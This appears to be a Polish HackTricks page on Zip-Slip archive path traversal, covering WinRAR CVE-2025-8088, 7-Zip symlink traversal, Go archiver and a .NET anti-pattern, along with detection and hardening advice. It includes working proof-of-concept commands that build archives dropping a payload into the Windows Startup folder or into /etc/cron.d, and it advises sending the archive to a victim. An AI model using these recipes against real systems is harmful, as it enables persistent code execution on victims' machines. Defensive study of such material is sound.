# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Opis

Wiele formatów archiwów (ZIP, RAR, TAR, 7-ZIP itd.) pozwala, aby każdy wpis zawierał własną **ścieżkę wewnętrzną**. Gdy narzędzie do rozpakowywania bezkrytycznie respektuje tę ścieżkę, spreparowana nazwa pliku zawierająca `..` lub **ścieżkę absolutną** (np. `C:\Windows\System32\`) zostanie zapisana poza katalogiem wybranym przez użytkownika.
Ta klasa podatności jest powszechnie znana jako *Zip-Slip* lub **archive extraction path traversal**.<sup>[[6]](#references)</sup>

Konsekwencje obejmują od nadpisywania dowolnych plików po bezpośrednie uzyskanie **remote code execution (RCE)** poprzez umieszczenie payloadu w lokalizacji **auto-run**, takiej jak folder *Startup* systemu Windows.

## Przyczyna

1. Attacker tworzy archiwum, w którym jeden lub więcej nagłówków plików zawiera:
* Względne sekwencje traversal (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Ścieżki absolutne (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Lub spreparowane **symlinks**, które wskazują poza katalog docelowy (częste w ZIP/TAR na systemach *nix).
2. Victim rozpakowuje archiwum za pomocą podatnego narzędzia, które ufa osadzonej ścieżce (lub podąża za symlinks), zamiast ją sanityzować albo wymuszać rozpakowanie wewnątrz wybranego katalogu.
3. Plik zostaje zapisany w lokalizacji kontrolowanej przez attackera i wykonany/załadowany przy następnym uruchomieniu tej ścieżki przez system lub użytkownika.

### .NET `Path.Combine` + `ZipArchive` traversal

Częstym .NET anti-pattern jest łączenie docelowej lokalizacji z kontrolowanym przez użytkownika `ZipArchiveEntry.FullName` i rozpakowywanie bez normalizacji ścieżki:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Jeśli `entry.FullName` zaczyna się od `..\\`, następuje traversal; jeśli jest **ścieżką bezwzględną**, komponent po lewej stronie zostaje całkowicie odrzucony, co prowadzi do **dowolnego zapisu pliku** jako tożsamości ekstrakcji.
- Archiwum proof-of-concept zapisujące dane w sąsiednim katalogu `app`, monitorowanym przez skaner uruchamiany zgodnie z harmonogramem:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Upuszczenie tego pliku ZIP w monitorowanej skrzynce odbiorczej powoduje utworzenie pliku `C:\samples\app\0xdf.txt`, potwierdzając traversal poza `C:\samples\queue\` i umożliwiając wykorzystanie kolejnych prymitywów (np. DLL hijacks).

## Przykład z życia – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR dla Windows (w tym CLI `rar` / `unrar`, DLL oraz przenośny kod źródłowy) nie sprawdzał poprawnie nazw plików podczas rozpakowywania.
Złośliwe archiwum RAR zawierające wpis taki jak:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
trafiłby **poza** wybrany katalog wyjściowy i do folderu *Startup* użytkownika. Po zalogowaniu system Windows automatycznie wykonuje wszystko, co się w nim znajduje, zapewniając *persistent* RCE.<sup>[[5]](#references)</sup>

### Tworzenie archiwum PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Użyte opcje:
* `-ep`  – przechowuj ścieżki plików dokładnie w podanej postaci ( **nie** usuwaj początkowego `./`).

Dostarcz `evil.rar` ofierze i poinstruuj ją, aby wypakowała go przy użyciu podatnej wersji WinRAR.

### Zaobserwowane wykorzystanie na wolności

ESET poinformował o kampaniach spear-phishingowych RomCom (Storm-0978/UNC2596), w których załączano archiwa RAR wykorzystujące CVE-2025-8088 do wdrażania niestandardowych backdoorów i ułatwiania operacji ransomware.<sup>[[5]](#references)</sup>

## Nowsze przypadki (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Błąd**: wpisy ZIP będące **symbolic links** były dereferencjonowane podczas wypakowywania, co pozwalało atakującym opuścić katalog docelowy i nadpisywać dowolne ścieżki. Interakcja użytkownika ogranicza się do *otwarcia/wypakowania* archiwum.<sup>[[1]](#references)</sup>
* **Podatne wersje**: 7-Zip 21.02–24.09 (kompilacje dla Windows i Linux). Naprawiono w wersji **25.00** (lipiec 2025) i nowszych.
* **Ścieżka wpływu**: Nadpisanie `Start Menu/Programs/Startup` lub lokalizacji uruchamianych przez usługi → kod zostanie wykonany przy następnym logowaniu lub ponownym uruchomieniu usługi.
* **Szybki PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
W poprawionej wersji `/etc/cron.d` nie zostanie zmodyfikowany; symlink zostanie wypakowany jako link wewnątrz `/tmp/target`.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Błąd**: `archiver.Unarchive()` podąża za `../` i symlinkowanymi wpisami ZIP, zapisując dane poza `outputDir`.<sup>[[2]](#references)</sup>
* **Podatne wersje**: `github.com/mholt/archiver` ≤ 3.5.1 (projekt jest obecnie deprecated).
* **Naprawa**: Przejdź na `mholt/archives` ≥ 0.1.0 lub zaimplementuj sprawdzanie ścieżki kanonicznej przed zapisem.
* **Minimalna reprodukcja**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Wskazówki dotyczące wykrywania

* **Inspekcja statyczna** – Wyświetl wpisy archiwum i oznacz każdą nazwę zawierającą `../`, `..\\`, *ścieżki absolutne* (`/`, `C:`) lub wpisy typu *symlink*, których cel znajduje się poza katalogiem wypakowywania.
* **Kanonikalizacja** – Upewnij się, że `realpath(join(dest, name))` nadal rozpoczyna się od `dest`. W przeciwnym razie odrzuć wpis.<sup>[[3]](#references)</sup>
* **Wypakowywanie w sandboxie** – Rozpakowuj do jednorazowego katalogu przy użyciu *bezpiecznego* extractora (np. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i sprawdź, czy wynikowe ścieżki pozostają wewnątrz katalogu.
* **Monitorowanie endpointów** – Generuj alerty dotyczące nowych plików wykonywalnych zapisywanych w lokalizacjach `Startup`/`Run`/`cron` krótko po otwarciu archiwum przez WinRAR/7-Zip itp.

## Ograniczanie ryzyka i hardening

1. **Zaktualizuj extractor** – WinRAR 7.13+ i 7-Zip 25.00+ implementują sanitizację ścieżek/symlinków. Oba narzędzia nadal nie obsługują automatycznych aktualizacji.
2. Jeśli to możliwe, wypakowuj archiwa z opcją „**Do not extract paths**” / „**Ignore paths**”.
3. W systemach Unix obniż uprawnienia i zamontuj **chroot/namespace** przed wypakowaniem; w Windows użyj **AppContainer** lub sandboxa.
4. Jeśli tworzysz własny kod, normalizuj ścieżki za pomocą `realpath()`/`PathCanonicalize()` **przed** utworzeniem/zapisem i odrzucaj każdy wpis, który opuszcza katalog docelowy.

## Dodatkowe przypadki podatności / przypadki historyczne

* 2018 – Obszerne ostrzeżenie dotyczące *Zip-Slip* opublikowane przez Snyk, dotyczące wielu bibliotek Java/Go/JS.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011 dotycząca podobnego traversal podczas scalania `-ao`.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) – traversal podczas wypakowywania TAR w slugach (patch w wersji v1.2).<sup>[[7]](#references)</sup>
* Każda własna logika wypakowywania, która nie wywołuje `PathCanonicalize` / `realpath` przed zapisem.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
